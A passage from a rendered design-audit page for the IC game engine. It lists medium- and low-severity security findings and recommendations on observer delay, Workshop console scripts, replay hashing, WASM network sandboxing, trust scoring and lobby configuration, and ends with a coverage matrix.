+</ul>
+<p>In fog-authoritative mode, spectators see the full game state. Without a mandatory minimum delay, a spectator could relay fogged information to a player via out-of-band channels (Discord, phone) with trivial latency.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Define a <strong>minimum observer delay floor</strong> for ranked matches (e.g., 120 seconds / 3600 ticks — enough that tactical information is stale)</li>
+<li>Make this a <code>ProtocolLimits</code>-style hard floor that community servers cannot reduce below for ranked games</li>
+<li>Document this in the Competitive Integrity Summary table</li>
+<li>Add to D055’s ranked exit criteria</li>
+</ul>
+<p><strong>Milestone:</strong> M8 (ranked matchmaking ships Phase 5)</p>
+<hr>
+<h3 id="finding-8-console-script-iccmd-supply-chain-not-in-workshop-security-model"><a class="header" href="#finding-8-console-script-iccmd-supply-chain-not-in-workshop-security-model">Finding 8: Console Script <code>.iccmd</code> Supply Chain Not in Workshop Security Model</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> D058 (09g/D058-command-console.md), V18 (06-SECURITY.md)</p>
+<p>D058 describes Workshop-shareable <code>.iccmd</code> console scripts that are lobby-visible and loadable. These scripts are executable content distributed through the Workshop, but V18’s supply chain security model (anomaly detection, author signing, quarantine) doesn’t explicitly cover <code>.iccmd</code> files.</p>
+<p>Console scripts could:</p>
+<ul>
+<li>Execute commands that appear benign but subtly affect game settings</li>
+<li>Contain sequences that trigger developer mode in specific conditions</li>
+<li>Be shared socially (“use this script for better performance”) as a social engineering vector</li>
+</ul>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Explicitly add <code>.iccmd</code> files to V18’s supply chain security scope — they must be subject to the same SHA-256 integrity, author signing (V49), and quarantine (V51) as other Workshop content</li>
+<li>Console scripts must respect the same permission model as direct console commands (D058’s command flags — <code>DEV_ONLY</code>, <code>SERVER</code>, achievement/ranked flags apply per-command within scripts)</li>
+<li>Add a sandboxing note: <code>.iccmd</code> scripts execute through the command parser, never as raw Rust/Lua — they can only invoke registered commands, not arbitrary code</li>
+</ul>
+<p><strong>Milestone:</strong> M6 (console ships Phase 3, Workshop scripts Phase 5)</p>
+<hr>
+<h3 id="finding-9-certifiedmatchresult-integrity-when-replay-has-frame-loss"><a class="header" href="#finding-9-certifiedmatchresult-integrity-when-replay-has-frame-loss">Finding 9: CertifiedMatchResult Integrity When Replay Has Frame Loss</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V13, V45 (06-SECURITY.md)</p>
+<p><code>CertifiedMatchResult.replay_hash</code> is SHA-256 of the full replay data. V45 documents that <code>BackgroundReplayWriter</code> can lose frames during I/O spikes. If frames are lost:</p>
+<ol>
+<li>The <code>replay_hash</code> in the <code>CertifiedMatchResult</code> hashes the <strong>incomplete</strong> replay (with gap markers)</li>
+<li>A second client’s replay of the same match has different content (different frames lost, or no frames lost)</li>
+<li>The “cross-check” in V13 (<code>if any player also submitted a replay, verify hashes match</code>) will <strong>always fail</strong> between clients with different frame loss patterns</li>
+</ol>
+<p>This means CertifiedMatchResult cross-verification is fragile — it can only succeed when both clients have identical frame loss patterns (unlikely).</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Separate <code>replay_hash</code> from <code>certified_game_hash</code>: the <code>CertifiedMatchResult</code> should contain a hash of the <strong>order stream</strong> (deterministic, no frame loss) rather than the full replay file (which includes client-specific recording artifacts)</li>
+<li>The replay file hash remains useful for per-file integrity, but the match certification hash should be over deterministic data only</li>
+<li>Add this distinction to V13’s struct definition</li>
+</ul>
+<p><strong>Milestone:</strong> M4 (replay system ships Phase 2)</p>
+<hr>
+<h3 id="finding-10-v43-wasm-network-access--raw-socket-ambiguity"><a class="header" href="#finding-10-v43-wasm-network-access--raw-socket-ambiguity">Finding 10: V43 WASM Network Access — Raw Socket Ambiguity</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V43 (06-SECURITY.md), 04-MODDING.md</p>
+<p>V43’s DNS rebinding mitigation assumes the host mediates all network access. But the doc doesn’t explicitly state that WASM mods <strong>cannot</strong> perform raw socket operations. The WASM capability model (<code>ModCapabilities.network</code>) defines <code>AllowList(Vec&lt;String&gt;)</code> but the host API surface for network access isn’t fully enumerated.</p>
+<p>If a WASM mod has access to a general-purpose HTTP function that accepts arbitrary URLs, the DNS pinning and IP range blocking must be in that function. But if the mod somehow obtains lower-level access (e.g., via a WASI preview2 socket capability), it could bypass the host’s network filtering entirely.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Explicitly state: “WASM mods access the network <strong>exclusively</strong> through host-provided <code>ic_http_get()</code> / <code>ic_http_post()</code> imports. No WASI networking capabilities are granted. Raw socket, DNS resolution, and TCP/UDP access are never available to WASM modules.”</li>
+<li>Add to <code>04-MODDING.md</code> § WASM Sandbox Rules and cross-reference from V43</li>
+<li>The <code>wasmtime</code> configuration must explicitly deny WASI networking — document this as a Phase 4 exit criterion</li>
+</ul>
+<p><strong>Milestone:</strong> M7 (WASM modding ships Phase 4)</p>
+<hr>
+<h3 id="finding-11-trustscore-computation-algorithm-unspecified"><a class="header" href="#finding-11-trustscore-computation-algorithm-unspecified">Finding 11: TrustScore Computation Algorithm Unspecified</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V12 (06-SECURITY.md)</p>
+<p><code>TrustScore.score</code> is <code>u16</code> (0–12000) and <code>TrustFactors</code> contains 7 <code>f64</code>/<code>u32</code>/<code>u8</code> fields, but:</p>
+<ul>
+<li>The weighting algorithm converting factors to score is not specified</li>
+<li>Factor ranges and normalization are undefined (what <code>account_age_days</code> value maps to what contribution?)</li>
+<li>No specification prevents trivial gaming: creating old accounts that sit idle → high <code>account_age_days</code> → higher trust without actual gameplay</li>
+</ul>
+<p>Without a specified algorithm, implementations could create vastly different trust behaviors across community servers, undermining the design’s purpose.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Define the default weighting formula (even as pseudocode) with documented factor contributions</li>
+<li>Specify normalization: <code>account_age_days</code> saturates at (e.g.) 365 days contribution</li>
+<li><code>rated_games_played</code> should have a minimum threshold before positively influencing trust (e.g., first 20 games do not contribute)</li>
+<li><code>anti_cheat_points</code> should be the dominant negative factor — no positive factor should override active anti-cheat flags</li>
+<li>Mark this as configurable per community but with defined defaults</li>
+</ul>
+<p><strong>Milestone:</strong> M8 (trust score ships Phase 5)</p>
+<hr>
+<h3 id="finding-12-lobby-host-configuration-manipulation"><a class="header" href="#finding-12-lobby-host-configuration-manipulation">Finding 12: Lobby Host Configuration Manipulation</a></h3>
+<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> Not covered in 06-SECURITY.md</p>
+<p>The security document doesn’t address malicious lobby hosts. In IC’s relay architecture, the lobby host sets game parameters (map, rules, balance preset, game speed). A malicious host could:</p>
+<ul>
+<li>Configure asymmetric starting conditions (more resources for self)</li>
+<li>Select obscure balance presets that advantage specific factions</li>
+<li>Set developer mode during lobby setup in ways that aren’t visible to joining players</li>
+<li>Modify lobby settings after players join but before they notice</li>
+</ul>
+<p>The relay server validates orders during gameplay but the lobby configuration itself isn’t validated for fairness.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Add a Vulnerability entry covering lobby configuration manipulation</li>
+<li>Lobby settings changes after a player joins should trigger a visible notification to all players</li>
+<li>Ranked lobbies should validate settings against a whitelist of ranked-eligible configurations (map pool, standard balance presets, standard game speed)</li>
+<li>All lobby settings must be included in the match metadata visible to the ranking authority</li>
+</ul>
+<p><strong>Milestone:</strong> M5 (lobby/matchmaking ships Phase 5)</p>
+<hr>
+<h3 id="finding-13-cross-reference-inconsistency--v15-protocollimits-field-duplication"><a class="header" href="#finding-13-cross-reference-inconsistency--v15-protocollimits-field-duplication">Finding 13: Cross-Reference Inconsistency — V15 ProtocolLimits Field Duplication</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V15, V17 (06-SECURITY.md), 03-NETCODE.md</p>
+<p><code>ProtocolLimits</code> is fully defined in V15 with all fields (including D059 voice/coordination limits). V17 references it but says <code>// ... fields defined in V15 above</code>. However, <code>03-NETCODE.md</code> § Order Rate Control also references <code>ProtocolLimits</code> but only links to <code>06-SECURITY.md</code> without defining which fields exist.</p>
+<p>The D059 voice limits (<code>max_voice_packets_per_second: 50</code>, <code>max_pings_per_interval: 3</code>) were added to the V15 struct definition but are not cross-referenced in D059’s own security considerations table (which lists rate limits but doesn’t reference the specific <code>ProtocolLimits</code> field names).</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Add a cross-reference from D059’s security table to <code>06-SECURITY.md</code> V15’s <code>ProtocolLimits</code> struct — the specific field names and values should be traceable</li>
+<li>Consider making <code>ProtocolLimits</code> a standalone definition in <code>03-NETCODE.md</code> (the canonical netcode doc) with <code>06-SECURITY.md</code> as the threat-model counterpart</li>
+</ul>
+<p><strong>Milestone:</strong> Documentation cleanup, no implementation change needed</p>
+<hr>
+<h3 id="finding-14-v35-simreconciler-constants--deferral-risk"><a class="header" href="#finding-14-v35-simreconciler-constants--deferral-risk">Finding 14: V35 SimReconciler Constants — Deferral Risk</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V35 (06-SECURITY.md), 07-CROSS-ENGINE.md</p>
+<p>V35 defines <code>MAX_TICKS_SINCE_SYNC = 300</code>, <code>MAX_CREDIT_DELTA = 5000</code>, health cap at 1000 — but explicitly states these are “deferred to M7” and “not part of M4 exit criteria.” This creates a risk: if cross-engine reconciliation is implemented before M7 (even experimentally), the bounds enforcement may be forgotten since it’s explicitly deferred.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>The constants are correctly defined. Add a build-time assertion or <code>todo!()</code> marker in the reconciler code path that fires if bounds checking is missing — similar to <code>unimplemented!()</code> but with a reference to V35.</li>
+<li>Ensure the milestone dependency map has a hard edge from reconciler implementation to V35 bounds enforcement.</li>
+</ul>
+<p><strong>Milestone:</strong> M7 (confirmed deferral, no change needed — just add implementation-time guard)</p>
+<hr>
+<h3 id="finding-15-v34-ewma-nan-guard--alpha-validation-timing"><a class="header" href="#finding-15-v34-ewma-nan-guard--alpha-validation-timing">Finding 15: V34 EWMA NaN Guard — Alpha Validation Timing</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V34 (06-SECURITY.md)</p>
+<p>V34 says “<code>alpha</code> is validated at construction to be in <code>(0.0, 1.0)</code> exclusive.” However, the <code>EwmaTrafficMonitor</code> struct has <code>pub alpha: f64</code> — a public field that can be modified after construction, bypassing the construction-time validation.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Make <code>alpha</code> private with a validated setter, consistent with the Validated Construction Policy in <code>architecture/type-safety.md</code></li>
+<li>Or use the <code>_private: ()</code> pattern from the type-safety document to prevent direct construction</li>
+</ul>
+<p><strong>Milestone:</strong> M4 (traffic monitor implementation)</p>
+<hr>
+<h3 id="finding-16-missing-threat--observer-mode-rng-state-leak"><a class="header" href="#finding-16-missing-threat--observer-mode-rng-state-leak">Finding 16: Missing Threat — Observer Mode RNG State Leak</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> 06-SECURITY.md, 03-NETCODE.md</p>
+<p>In lockstep mode, all clients share the same deterministic RNG state. Observers receive all orders and run the full simulation. If an observer has access to the RNG state (which they must, to run the sim), they can predict:</p>
+<ul>
+<li>Random crate spawns before they appear</li>
+<li>AI decision outcomes</li>
+<li>Any randomized game mechanic</li>
+</ul>
+<p>Combined with out-of-band communication, this enables prediction-based advantage for a player cooperating with an observer. In fog-authoritative mode, this is less of a concern (observer gets filtered state), but in standard lockstep relay mode, the observer has everything.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Document this as a known limitation of lockstep observer mode</li>
+<li>The ranked observer delay (Finding 7) mitigates the competitive impact</li>
+<li>For tournament play with live observers, fog-authoritative mode should be recommended</li>
+</ul>
+<p><strong>Milestone:</strong> No implementation change — documentation addition</p>
+<hr>
+<h3 id="finding-17-v26-win-trading--storage-cost-of-per-pair-match-history"><a class="header" href="#finding-17-v26-win-trading--storage-cost-of-per-pair-match-history">Finding 17: V26 Win-Trading — Storage Cost of Per-Pair Match History</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V26 (06-SECURITY.md)</p>
+<p>The diminishing returns formula (<code>0.5^(n-1)</code>) requires tracking per-opponent-pair match counts within a rolling 30-day window. For a community with P players, the worst-case storage is O(P²) opponent pairs. The doc doesn’t address:</p>
+<ul>
+<li>Whether this is stored in the same SQLite database as ratings</li>
+<li>Index strategy for efficient lookup during rating computation</li>
+<li>Cleanup strategy for expired 30-day windows</li>
+</ul>
+<p>For 10,000 active players, worst-case is ~100M pair entries (though typically much sparser).</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Specify that opponent-pair tracking uses a sparse representation (only pairs with ≥1 match are stored)</li>
+<li>Add an expiry cleanup job that runs with the weekly population baseline recalculation</li>
+<li>Document the expected storage: ~50 bytes per match pair × active pairs per month</li>
+</ul>
+<p><strong>Milestone:</strong> M8 (ranked system ships Phase 5)</p>
+<hr>
+<h3 id="finding-18-v44-developer-mode--single-player-toggle-vs-replay-determinism"><a class="header" href="#finding-18-v44-developer-mode--single-player-toggle-vs-replay-determinism">Finding 18: V44 Developer Mode — Single-Player Toggle vs Replay Determinism</a></h3>
+<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V44 (06-SECURITY.md)</p>
+<p>V44 states “In single-player and replays, dev mode can be toggled freely.” But dev mode is a sim <code>Resource</code> in <code>ic-sim</code> (part of deterministic state). If a player toggles dev mode mid-game in single-player, the replay records this toggle. If someone views the replay without knowing dev mode was used, the replay’s behavior may be confusing (e.g., instant builds happening with no visible explanation).</p>
+<p>V44 also states “Replays record the dev mode flag” — but this appears to be a per-match flag, not a per-tick state. If dev mode is toggled mid-game, the per-match flag doesn’t capture the toggling pattern.</p>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Dev mode toggles should be recorded as <code>PlayerOrder::DevCommand(DevAction::ToggleDevMode)</code> in the replay order stream — not just a header flag</li>
+<li>The replay viewer should display a visible indicator when dev mode is active during playback</li>
+<li>This is consistent with the existing order-based architecture (dev mode changes go through the order pipeline)</li>
+</ul>
+<p><strong>Milestone:</strong> M4 (replay system ships Phase 2)</p>
+<hr>
+<h3 id="audit-coverage-matrix"><a class="header" href="#audit-coverage-matrix">Audit Coverage Matrix</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Security Domain</th><th>Documents Reviewed</th><th>Vulnerabilities Covered</th><th>Findings</th></tr>
+</thead>
+<tbody>
+<tr><td>Anti-cheat / behavioral analysis</td><td>V12, V34, V36, V54, V55</td><td>5</td><td>F1, F7</td></tr>
+<tr><td>Network / transport</td><td>V14, V15, V17, V24, V32</td><td>5</td><td>F2, F13</td></tr>
+<tr><td>Identity / credentials</td><td>V47, V48, D052</td><td>3</td><td>F3, F4</td></tr>
+<tr><td>Modding sandbox (WASM/Lua)</td><td>V5, V39, V43, V50</td><td>4</td><td>F5, F10</td></tr>
+<tr><td>Workshop supply chain</td><td>V18–V23, V49, V51, V52</td><td>8</td><td>F8</td></tr>
+<tr><td>Replay / save integrity</td><td>V41, V42, V45, V6</td><td>4</td><td>F6, F9, F18</td></tr>
+<tr><td>Ranked / competitive</td><td>V26–V31, V33, V44</td><td>8</td><td>F7, F11, F12, F17</td></tr>
+<tr><td>Cross-engine</td><td>V35, V36, 07-CROSS-ENGINE.md</td><td>2</td><td>F14</td></tr>
+<tr><td>External tools (ICRP)</td><td>D071</td><td>1</td><td>F2</td></tr>
+<tr><td>Player identity / display</td><td>V46, V56</td><td>2</td><td>—</td></tr>
+<tr><td>Format parsing (ra-formats)</td><td>V38</td><td>1</td><td>—</td></tr>
+<tr><td>LLM content</td><td>V40</td><td>1</td><td>—</td></tr>
+<tr><td>Console / communication</td><td>D058, D059</td><td>2</td><td>F8</td></tr>
+<tr><td>Spectator / observer</td><td>D071, D055</td><td>—</td><td>F7, F16</td></tr>
+<tr><td>Lobby configuration</td><td>Not covered</td><td>0</td><td>F12</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="verification-known-good-areas"><a class="header" href="#verification-known-good-areas">Verification: Known-Good Areas</a></h3>
+<p>These areas were audited and found to be well-designed with no gaps:</p>
+<ul>
+<li><strong>V38 ra-formats parser safety:</strong> Comprehensive — decompression ratio caps, per-format entry limits, iteration counters, mandatory fuzzing, Zip Slip defense via strict-path. Well-referenced across documents.</li>
+<li><strong>V18 Workshop supply chain:</strong> Five independent layers with academic precedent citations (fractureiser, npm, crates.io). Defense-in-depth is thorough.</li>
+<li><strong>V2 Order validation:</strong> Deterministic validation inside sim (D012) is architecturally sound — validation IS the anti-cheat, not a bolt-on.</li>
+<li><strong>V14 Transport encryption:</strong> Follows GNS/DTLS patterns. Sequence-bound nonces, identity binding, mandatory encryption — no shortcuts.</li>
+<li><strong>V46 Display name Unicode:</strong> UTS #39 skeleton algorithm + mixed-script restriction + BiDi stripping — covers the known attack surface comprehensively.</li>
+<li><strong>Type-safety architecture:</strong> 13 distinct patterns from newtypes to verified wrappers. The <code>_private: ()</code> pattern and typestate machines are well-applied to security-critical state machines.</li>
+<li><strong>Path security infrastructure:</strong> Consistent use of <code>strict-path PathBoundary</code> across all 7 integration points. Addresses 19+ CVE patterns.</li>
+<li><strong>V3 Lag switch + V11 Speed hack:</strong> Relay-as-clock-authority is a structural defense. The strike system and behavioral integration are well-designed.</li>
+<li><strong>Cross-engine trust tiers (07-CROSS-ENGINE.md):</strong> Explicit security comparison matrix for IC-hosts vs IC-joins. Correctly recommends “always prefer IC as host.”</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../architecture/api-misuse-patterns.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
+                            </a>
+
+                            <a rel="next prefetch" href="../03-NETCODE.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../architecture/api-misuse-patterns.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
+                    </a>
+
+                    <a rel="next prefetch" href="../03-NETCODE.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
+                    </a>
+            </nav>
+
+        </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
+        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
+        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
+        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
+        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../mark-09e88c2c.min.js"></script>
+        <script src="../searcher-c2a407aa.js"></script>
+
+        <script src="../clipboard-1626706a.min.js"></script>
+        <script src="../highlight-abc7f01d.js"></script>
+        <script src="../book-a0b12cfe.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+
+    </div>
+    </body>
+</html>
